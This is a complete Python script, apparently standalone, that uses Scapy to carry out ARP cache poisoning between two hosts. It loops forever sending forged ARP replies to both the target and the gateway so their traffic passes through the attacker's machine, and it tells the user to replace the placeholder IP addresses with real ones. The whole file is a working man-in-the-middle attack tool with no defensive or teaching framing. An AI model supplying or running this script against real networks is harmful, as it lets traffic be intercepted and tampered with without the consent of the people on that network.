from scapy.all import *
import time

def arp_poison(target_ip, gateway_ip):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    print(f"Poisoning {target_ip} and {gateway_ip}")

    while True:
        # Poison target's ARP cache
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
        
        # Poison gateway's ARP cache
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
        
        time.sleep(2)  # Send ARP packets every 2 seconds

# Replace with actual IP addresses
HOST1_IP = "10.0.0.1"  # Host 1 IP
HOST2_IP = "10.0.0.2"  # Host 2 IP

try:
    arp_poison(HOST1_IP, HOST2_IP)
except KeyboardInterrupt:
    print("ARP poisoning stopped")
